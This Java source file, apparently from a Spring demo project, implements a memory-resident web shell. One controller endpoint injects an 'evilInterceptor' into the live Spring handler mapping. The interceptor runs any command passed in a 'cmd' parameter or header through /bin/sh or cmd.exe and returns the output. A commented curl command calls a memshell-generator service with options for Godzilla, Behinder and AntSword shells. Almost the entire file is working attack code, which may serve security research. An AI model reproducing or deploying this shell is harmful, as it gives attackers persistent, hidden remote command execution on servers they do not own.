package com.DemoSpring;

import com.Utils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.AsyncHandlerInterceptor;

import java.io.InputStream;
import java.util.List;
import java.util.Scanner;
import java.util.Set;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.ModelAndView;

import static com.Utils.*;

/**
 * https://goodapple.top/archives/1355
 */
//curl --path-as-is -i -s -k -X $'POST' \
//    -H $'Host: party.mem.mk' -H $'Content-Length: 495' -H $'Sec-Ch-Ua-Platform: \"macOS\"' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0' -H $'Sec-Ch-Ua: \"Microsoft Edge\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Accept: */*' -H $'Origin: https://party.mem.mk' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://party.mem.mk/ui' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6' -H $'Priority: u=1, i' \
//    --data-binary $'{\"shellConfig\":{\"server\":\"SpringWebMvc\",\"serverVersion\":\"Unknown\",\"shellTool\":\"Command\",\"shellType\":\"Interceptor\",\"debug\":false,\"targetJreVersion\":\"50\",\"byPassJavaModule\":false,\"shrink\":true},\"shellToolConfig\":{\"shellClassName\":\"\",\"godzillaPass\":\"\",\"godzillaKey\":\"\",\"commandParamName\":\"cmd\",\"behinderPass\":\"\",\"antSwordPass\":\"\",\"headerName\":\"User-Agent\",\"headerValue\":\"\",\"shellClassBase64\":\"\"},\"injectorConfig\":{\"urlPattern\":\"/*\",\"injectorClassName\":\"\",\"staticInitialize\":true},\"packer\":\"Base64\"}' \
//    $'https://party.mem.mk/api/memshell/generate'
@RestController
public class injectInterceptor {
    @RequestMapping("/injectInterceptor")
    public String  inject(){
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        try {
            Object obj = null;
//            try {
//                Object obj1 = invokeMethod(contextClassLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
//                Object obj2 = invokeMethod(obj1, "getRequest");
//                obj = invokeMethod(obj2, "getAttribute", new Class[]{String.class}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT"});
//            } catch (Exception e) {
//                Object next = ((Set) getField(contextClassLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts")).iterator().next();
//                if (contextClassLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(next.getClass())) {
//                     obj = next;
//                }
//            }
            WebApplicationContext context =
                    (WebApplicationContext) RequestContextHolder.currentRequestAttributes().
                            getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // org.springframework.context.support.AbstractApplicationContext.getBean(java.lang.String)
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping =
                    (org.springframework.web.servlet.handler.AbstractHandlerMapping)
                            context.getBean("requestMappingHandlerMapping");
            List<Object> list = (List) getField(abstractHandlerMapping, "adaptedInterceptors");
            for (Object obj3 : list) {
                if (obj3.getClass().getName().contains("evilInterceptor")) {
                    return "failed";
                }
            }
            list.add(new evilInterceptor());
            return "success";
        } catch (Exception e) {
            throw new RuntimeException(e);
        }


    }
}
class evilInterceptor implements AsyncHandlerInterceptor {
    public static String paramName = "cmd";

    public boolean preHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object obj) throws Exception {
        try {
            String parameter = httpServletRequest.getParameter(paramName);
            if (parameter == null || parameter.isEmpty()) {
                parameter = httpServletRequest.getHeader(paramName);
            }
            if (parameter == null) {
                return true;
            }
            httpServletResponse.getWriter().write(new Scanner(getInputStream(getParam(parameter))).useDelimiter("\\A").next());
            httpServletResponse.getWriter().flush();
            httpServletResponse.getWriter().close();
            return false;
        } catch (Throwable th) {
            return true;
        }
    }

    private String getParam(String str) {
        return str;
    }

    private InputStream getInputStream(String str) throws Exception {
        String[] split;
        String str2 = null;
        if (0 == 0) {
            split = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
        } else if (str2.contains("\"{command}\"")) {
            String[] split2 = str2.split("\\s+");
            for (int i = 0; i < split2.length; i++) {
                split2[i] = split2[i].replace("\"{command}\"", str);
            }
            split = split2;
        } else {
            split = str2.replace("{command}", str).split("\\s+");
        }
        return new ProcessBuilder(split).redirectErrorStream(true).start().getInputStream();
    }

    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object obj, ModelAndView modelAndView) throws Exception {
    }

    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object obj, Exception exc) throws Exception {
    }

    public void afterConcurrentHandlingStarted(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object obj) throws Exception {
    }
}
